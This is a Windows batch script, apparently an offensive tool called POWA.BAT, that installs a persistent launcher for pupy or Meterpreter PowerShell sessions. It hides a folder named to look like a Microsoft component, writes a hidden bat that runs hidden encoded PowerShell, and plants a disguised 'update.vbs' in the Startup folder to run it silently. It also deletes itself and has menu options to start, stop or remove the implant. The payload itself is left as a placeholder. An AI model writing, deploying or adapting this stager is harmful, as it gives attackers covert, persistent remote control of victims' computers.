REM #POWA.BAT#
REM #A batch file to assist with delivery of pupy or meterpreter reflective dll powershell sessions#
REM #Replace XXXXXXXXXXX with your own powershell code


:BatMenu
cls
echo.
echo  ______ _______ ________ _______    ______ _______ _______ 
echo |   __ \       |  |  |  |   _   |  |   __ \   _   |_     _|
echo |    __/   -   |  |  |  |       |__|   __ <       | |   |  
echo |___|  |_______|________|___|___|__|______/___|___| |___|    
echo.
echo Ver 0.1
echo inf0sec@tuta.io
echo.
ECHO.
ECHO echo POWA.BAT MENU
ECHO.
ECHO 1. BatControl - Control your POWA.BAT
ECHO 2. BatKill - Uninstall and remove POWA.BAT 
ECHO 3. BatYolo - Install & Self destruct POWA.BAT
ECHO 4. I need help! - Yes you do
ECHO 5. Rage Quit - Exit this awesome menu and go back to CMD
Echo.

set choice=
set /p choice=Choose how you want your bat to fly.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto BatControl
if '%choice%'=='2' goto BatRem
if '%choice%'=='3' goto BatStall
if '%choice%'=='4' goto BatHelp
if '%choice%'=='5' goto RageQuit
ECHO "%choice%" wtf, try again
ECHO.
goto BatMenu

:BatHelp
ECHO Dont be stupid
TIMEOUT 3
GOTO BatMenu


:BatStall
ECHO Your mission,should you choose to accept it,  is not to push CNTRL+C. This is your last chance to stop.... just saying....I die after I run
TIMEOUT /T 5 /NOBREAK
ECHO Arming...

REM First does a check to see if my directory is created, if not, creates it
if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate" goto DirExists
mkdir  "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"
attrib +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"

:DirExists
REM Does a check to see if my bat file exists, if not, creates it. 

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" goto FileExists
echo powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXX 1> "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"
attrib +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"

:FileExists
REM Has a look to see if the vbs script that runs at startup and hides the powershell window is setup, if not, sets it up

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs" goto BatStart

REM This bit created the vbs script to hide the POWA.BAT command.

ECHO Set WshShell = CreateObject("WScript.Shell")>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
ECHO WshShell^.Run chr^(34^) ^& "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" ^& Chr^(34^)^,^ ^0>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
ECHO Set WshShell = Nothing>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"

REM I didnt want 10000 spawns of powershell so this does a check to see if there is a powershell session running
REM If no powershell sessesion, it runs my command, if a powershell session, bat file exits


:KamaKazi
CLS
(goto) 2>nul & del "%~f0"

:BatRun
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I /N "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" goto RageQuit
powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

:BatRem

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" goto RemDel
ECHO The little shit is not installed here, so all good
PAUSE
CLS
GOTO BatMenu

:RemDel
taskkill /f /im powershell.exe
DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"
RMDIR "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"
DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"


:RageQuit
CLS
EXIT






:BatControl
CLS
ECHO.
ECHO 1. POWA.BAT STATUS
ECHO 2. POWA.BAT START 
ECHO 3. POWA.BAT STOP
ECHO 4. MAIN MENU

Echo.

set choice=
set /p choice=Match your batch.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto BatStatus
if '%choice%'=='2' goto BatStart
if '%choice%'=='3' goto BatStop
if '%choice%'=='4' goto BatMenu
ECHO "%choice%" try again
ECHO.
goto BatControl



:BatStart
CLS
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I /N "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" goto BatRunning
powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
ECHO POWA.BAT Launched!
ECHO Check your listerners
TIMEOUT 5
GOTO BatControl

:BatRunning
CLS
echo POWA.BAT is currently running, not starting again
TIMEOUT 4
GOTO BatControl

:BatStop
CLS
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I /N "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" goto BatKill
ECHO POWA.BAT IS GEPUT
TIMEOUT 5
GOTO BatControl


:BatKill
CLS
ECHO The little shit is alive, so nailing it
taskkill /f /im powershell.exe
TIMEOUT 5
GOTO BatStop


:BatStatus
CLS
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I /N "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" echo The little shit is running
TIMEOUT 5
GOTO BatControl
